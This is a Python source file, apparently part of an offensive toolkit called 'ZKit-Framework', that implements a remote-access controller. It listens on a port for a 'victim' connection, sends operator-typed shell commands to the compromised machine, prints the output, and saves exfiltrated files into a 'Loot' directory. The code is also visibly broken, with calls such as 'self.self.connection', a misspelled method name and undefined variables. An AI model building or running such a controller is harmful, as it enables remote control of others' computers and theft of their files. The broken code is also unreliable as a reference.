import socket
import os
from os import path

if os.name == 'nt':
    from colorama import init
    init(convert=True)

from core.helper_core import notify


class Controller:
    def __init__(self, conn_type, port, type_):

        notify("notify", "Making Connection", "")

        try:
            self.get_socket(conn_type)
            self.make_the_connection()
            os = self.conn.recv(1024).decode('UTF-8')
            print(f"Victim is using {os}")
            notify("report", "Got Platfrom from victim", flush=True)
            connected = True
            while connected:
                print("{}@{} : ".format(Address, os), end='')
                command = str(input(""))
                self.conn.send(command.encode("UTF-8"))
                self.show_the_result()

        except:
            connected = False
            notify("problem",
                   "self.conn Failed.Victim Might Be Offline Try Again Later")

    def show_the_result(self):
        result = self.conn.recv(1024).decode("UTF-8")
        if type_ == 'ft':
            if result == '!!!':
                self.recv_file()
        else:
            print(result)

    def recv_file(self):
        filelen = self.conn.recv(1024).decode("UTF-8")
        filedata = self.conn.recv(int(filelen) + 100)
        file = self.conn.recv(1024).decode("UTF-8")
        file = path.dirname(path.dirname(
            path.dirname(__file__))) + '\\Loot\\' + file
        print(
            "ZKit-Framework got file from victim ({}) . writing it in {}".format(Address, file))
        with open(file, 'wb') as f:
            f.write(filedata)
        print("Operation was Succesful (file {})".format(file))

    def make_the_connnection(self):
        self.self.connection.bind(('', int(port)))
        self.self.conn.listen()
        self.conn, self.address = self.self.conn.accept()

    def get_socket(self, conn_type):
        if conn_type == "TCP":
            self.self.connection = socket.socket(
                socket.AF_INET, socket.SOCK_STREAM)
        elif self.conn_Type == "UDP":
            self.self.connection = socket.socket(
                socket.AF_INET, socket.SOCK_DGRAM)


def connect(conn_type: str, port: int, type_: str):
    Controller(conn_type, port, type_)
